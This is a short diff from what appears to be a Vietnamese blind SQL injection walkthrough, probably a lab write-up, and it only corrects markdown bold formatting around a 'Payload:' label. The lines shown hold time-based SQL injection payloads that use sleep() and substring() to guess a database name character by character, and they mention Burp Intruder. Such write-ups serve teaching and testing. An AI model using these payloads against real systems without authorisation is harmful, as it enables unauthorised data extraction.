@@ -360,7 +360,7 @@ Em thử với payload `' or (case when 1=2 then 1 else sleep(1) end)=1 -- ` th�
     
 * Tìm tên database
 
-    **Payload: **`' or (case when substring((database),1,1)='a' then sleep(1) else 1 end)=1 -- `
+    **Payload:** `' or (case when substring((database),1,1)='a' then sleep(1) else 1 end)=1 -- `
 
     Send to Intruder:
 
